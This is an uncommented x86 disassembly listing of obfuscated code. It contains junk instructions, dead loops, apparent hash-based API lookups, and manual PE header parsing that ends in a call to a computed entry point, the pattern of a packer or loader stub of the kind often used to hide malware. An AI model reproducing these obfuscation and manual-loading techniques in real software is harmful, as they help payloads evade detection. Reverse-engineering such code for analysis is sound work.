  4094f1:	cmp    DWORD PTR ds:0x42efac,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ed38
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42efac
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42efac,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e8ea
  409527:	or     edi,DWORD PTR ds:0x4306be
  40952d:	mov    DWORD PTR ds:0x42e8ea,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x430622,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43061a
  40955e:	sbb    DWORD PTR ds:0x42ef8c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42efa4,0x19
  409570:	cmp    DWORD PTR ds:0x42efa4,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42efa4,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42ec38
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42efa4
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42efa4,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e8de,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e8de
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e8de,edi
  4095f1:	cmp    DWORD PTR ds:0x42e8de,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e8de,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ed3c
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e8e2,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x430622
  409649:	sub    DWORD PTR ds:0x43060a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42efac,0x430622
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x43062a,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e8ee,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e8de,0x1f
  409686:	cmp    DWORD PTR ds:0x42e8de,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e8de,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ec54
  4096b3:	cmp    DWORD PTR ds:0x42e8de,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e8de
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e8de,eax
  4096cb:	mov    eax,ds:0x42e8de
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e8de,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42efa4,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42efa4
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42efa4,ecx
  4096f7:	cmp    DWORD PTR ds:0x42efa4,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42efa4,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430612
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ed40
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43060a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ef94,0x1a
  409737:	cmp    DWORD PTR ds:0x42ef94,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ef94,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42efac
  409763:	call   DWORD PTR ds:0x42ed44
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ef94
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ef94,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x43062e,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x4306ce,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ef98
  4097a8:	sub    DWORD PTR ds:0x42e8e2,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x4306c6
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e8da,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e8da
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e8da,edx
  4097d5:	cmp    DWORD PTR ds:0x42e8da,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x4306d6
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ec58
  4097f0:	cmp    DWORD PTR ds:0x42e8da,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e8da
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e8da,edx
  40980a:	cmp    DWORD PTR ds:0x42e8da,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x4306c2,0x1c
  40982b:	cmp    DWORD PTR ds:0x4306c2,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x4306c2,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ed48
  409850:	cmp    DWORD PTR ds:0x4306c2,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x4306c2
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x4306c2,edx
  40986a:	mov    edx,DWORD PTR ds:0x4306c2
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x4306c2,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ef94,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x4306ca,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x430622,0x42e8f2
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x43063a,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x43063a
  4098b7:	inc    eax
  4098b8:	mov    ds:0x43063a,eax
  4098bd:	cmp    DWORD PTR ds:0x43063a,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x43063a,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ed4c
  4098eb:	cmp    DWORD PTR ds:0x43063a,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x43063a
  4098fd:	inc    eax
  4098fe:	mov    ds:0x43063a,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x430642,0x430626
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ef9c,0x42e8ee
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ef94,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ef94
  409945:	inc    eax
  409946:	mov    ds:0x42ef94,eax
  40994b:	cmp    DWORD PTR ds:0x42ef94,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ef94,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42ec60
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43061e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e8de,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x430642
  409998:	xor    ecx,DWORD PTR ds:0x43063e
  40999e:	mov    DWORD PTR ds:0x430642,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x430636,0x42ef94
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e8ea,0x42ef88
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x43063a,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x430632,0x430642
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e8de,0x42e8ea
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e8f2,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x4306c6,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e8da,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430606,0x4306d2
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e8de
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x4306da,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e8ee,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e8ee,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ef90,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43061a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e8de,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x4306ce,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x43063e,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x4306da,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x4306ca,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x4306d2,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ef8c,0x42e8de
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x43063a
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ef8c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x4306c6,0x42efa8
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e8ea,0x43061a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x43062a,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e8de,0x4306ce
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x430642
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42efa8,0x430616
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42efa4,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430606,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430616
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x430622,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43060e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x43063a,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x430622,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e8f6,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x43063e,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x4306c2,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x4306c6,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x4306c6,0x42ef8c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
